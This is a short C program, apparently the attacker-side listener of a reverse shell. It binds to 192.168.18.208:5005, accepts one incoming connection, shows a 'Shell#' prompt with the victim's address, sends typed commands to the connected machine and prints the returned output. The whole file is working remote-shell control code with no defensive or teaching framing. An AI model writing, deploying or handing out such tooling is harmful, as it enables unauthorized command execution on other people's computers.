#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <string.h>



int main(){

  int sock, client_sock;
  char buff[1024];
  char response_t[18384];

  struct sockaddr_in server_sock, client_address;
  int opt = 1;
  int optvalue=1;
  socklen_t client_l;

  sock = socket(AF_INET, SOCK_STREAM, 0);

  if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optvalue, sizeof(optvalue)) < 0){
    printf("[*] Error al establecer una conexion TCP.. !\n");
    return 1;
  }

  server_sock.sin_family = AF_INET;
  server_sock.sin_addr.s_addr = inet_addr("192.168.18.208");
  server_sock.sin_port = htons(5005);

  bind(sock, (struct sockaddr *) &server_sock , sizeof(server_sock));
  listen(sock, 5);
  
  client_l = sizeof(client_address);
  client_sock = accept(sock, (struct sockaddr *) &client_address, &client_l);
  while(1){
    jump:
    bzero(&buff, sizeof(buff));
    bzero(&response_t, sizeof(response_t));
    printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
    fgets(buff, sizeof(buff), stdin);
    strtok(buff, "\n");
    write(client_sock, buff, sizeof(buff));
    if(strncmp("quiet", buff, 5) == 0){
      break;
    }else{
      recv(client_sock, response_t, sizeof(response_t), MSG_WAITALL);
      printf("%s", response_t);
    }
  }

  return 0;
}
